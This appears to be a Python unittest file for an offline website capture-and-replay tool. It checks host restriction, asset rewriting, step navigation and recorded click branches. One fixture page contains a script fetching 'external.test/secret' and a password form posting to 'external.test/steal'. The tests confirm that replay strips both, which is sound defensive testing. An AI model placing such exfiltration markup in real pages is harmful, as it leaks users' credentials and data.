"""Offline replay regression tests without a browser or live website."""
import base64
import json
from pathlib import Path
import tempfile
import unittest
from capture_replay import CaptureReplay


class ReplayTests(unittest.TestCase):
    def make_recording(self, base):
        folder = Path(base)
        (folder / "bundle.json").write_text(json.dumps({
            "startUrl": "https://example.test/a/b",
            "steps": [{"url": "https://example.test/a/b", "html": "step-000.html"},
                      {"url": "https://example.test/a/b", "html": "step-001.html"}]
        }))
        (folder / "step-000.html").write_text(
            "<!doctype html><html><body><img src='/logo.png'>"
            "<script>fetch('https://external.test/secret')</script>"
            "<form action='https://external.test/steal'><input type='password' value='dummy'>"
            "<button type='submit'>Continue</button></form>"
            "<a href='https://external.test'>External</a></body></html>"
        )
        (folder / "step-001.html").write_text("<html><body><p>Stage 2</p></body></html>")
        (folder / "trace.har").write_text(json.dumps({"log": {"entries": [{
            "request": {"method": "GET", "url": "https://example.test/logo.png"},
            "response": {"content": {"mimeType": "image/png",
                                     "text": base64.b64encode(b"IMAGE").decode(),
                                     "encoding": "base64"}}
        }]}}))

    def test_visual_assets_and_scripts_restricted(self):
        with tempfile.TemporaryDirectory() as t:
            self.make_recording(t)
            replay = CaptureReplay(t)
            self.assertEqual(replay.host, "example.test")
            status, raw, _ = replay.respond("GET", "/a/b")
            page = raw.decode()
            self.assertEqual(status, 200)
            self.assertNotIn("external.test", page)
            self.assertNotIn("dummy", page)
            self.assertIn("/__mock_capture/assets/", page)
            self.assertIn("/__mock_capture/sim.js", page)
            self.assertIn("form", page)
            self.assertEqual(replay.respond("GET", "/a/b", "__mock_step=1")[0], 200)
            self.assertIn("Stage 2", replay.respond("GET", "/a/b", "__mock_step=1")[1].decode())
            self.assertEqual(replay.respond("POST", "/a/b")[0], 405)
            self.assertEqual(replay.respond("GET", "/wrong")[0], 404)
            self.assertEqual(replay.respond("GET", "/a/b", "__mock_step=999")[0], 404)


    def test_recorder_and_proxy_have_valid_python_syntax(self):
        root = Path(__file__).resolve().parents[1]
        for script in ("automatic_capture.py", "record_site.py",
                       "run_capture_proxy.py", "capture_replay.py"):
            source = (root / script).read_text(encoding="utf-8")
            compile(source, script, "exec")

    def test_auto_recorder_revisited_state_reuses_branch_node(self):
        # Extract the recorder class without importing Playwright in unit tests.
        import ast
        import hashlib
        import time
        source = (Path(__file__).resolve().parents[1] / "automatic_capture.py").read_text()
        tree = ast.parse(source)
        recorder_class = next(node for node in tree.body
                              if isinstance(node, ast.ClassDef) and node.name == "Recorder")
        unit = ast.Module(body=[recorder_class], type_ignores=[])
        scope = {"hashlib": hashlib, "time": time, "json": json,
                 "MARKER": "__MOCK_AUTO_EVENT__"}
        exec(compile(unit, "automatic_capture.py", "exec"), scope)
        Recorder = scope["Recorder"]

        class FakePage:
            def __init__(self):
                self.url = "https://example.test/home"
                self.content = "<html><body><button id='a'>A</button><button id='b'>B</button></body></html>"
            def on(self, event, callback):
                pass
            def evaluate(self, code):
                return self.content
            def screenshot(self, path, **kwargs):
                Path(path).write_bytes(b"PNG")

        class Msg:
            def __init__(self, obj):
                self.text = "__MOCK_AUTO_EVENT__" + json.dumps(obj)

        with tempfile.TemporaryDirectory() as d:
            page = FakePage()
            recorder = Recorder(page, Path(d), 12)
            self.assertTrue(recorder.snapshot("initial"))
            recorder.on_console(Msg({"kind":"click", "selector":"#a", "tag":"button"}))
            page.url = "https://example.test/a"
            page.content = "<html><body><p>A screen</p></body></html>"
            self.assertTrue(recorder.snapshot("click"))
            recorder.on_console(Msg({"kind":"click", "selector":"#back", "tag":"button"}))
            page.url = "https://example.test/home"
            page.content = "<html><body><button id='a'>A</button><button id='b'>B</button></body></html>"
            self.assertTrue(recorder.snapshot("click"))
            self.assertEqual(len(recorder.steps), 2)  # Revisit is not a new node.
            self.assertEqual(recorder.current_index, 0)
            recorder.on_console(Msg({"kind":"click", "selector":"#b", "tag":"button"}))
            page.url = "https://example.test/b"
            page.content = "<html><body><p>B screen</p></body></html>"
            recorder.snapshot("click")
            self.assertEqual(len(recorder.steps), 3)
            branches = [e for e in recorder.transitions if e["from"] == 0]
            self.assertEqual({(e["selector"], e["to"]) for e in branches},
                             {("#a", 1), ("#b", 2)})

    def test_recorded_branches_not_arbitrary_next_step(self):
        with tempfile.TemporaryDirectory() as t:
            self.make_recording(t)
            folder = Path(t)
            bundle = json.loads((folder / "bundle.json").read_text())
            bundle["steps"][1]["url"] = "https://example.test/login"
            bundle["transitions"] = [
                {"from": 0, "to": 1, "kind": "click", "selector": "#buy",
                 "outcome": "changed", "observed": True},
                {"from": 0, "to": 0, "kind": "click", "selector": "#details",
                 "outcome": "no-change", "observed": True},
            ]
            (folder / "bundle.json").write_text(json.dumps(bundle))
            (folder / "step-000.html").write_text(
                "<html><body><button id='buy'>Buy</button>"
                "<button id='details'>Details</button></body></html>"
            )
            replay = CaptureReplay(folder)
            first = replay.respond("GET", "/a/b")[1].decode()
            self.assertIn("data-transitions=", first)
            self.assertIn("#buy", first)
            self.assertIn("#details", first)
            self.assertIn("login", first)
            self.assertIn("observed", first)
            self.assertIn("location.assign", replay.respond("GET", "/__mock_capture/sim.js")[1].decode())
            self.assertEqual(replay.respond("GET", "/login", "__mock_step=1")[0], 200)
            self.assertEqual(replay.respond("GET", "/a/b", "__mock_step=1")[0], 404)
            self.assertEqual(replay.respond("GET", "/unobserved")[0], 404)

if __name__ == "__main__":
    unittest.main()
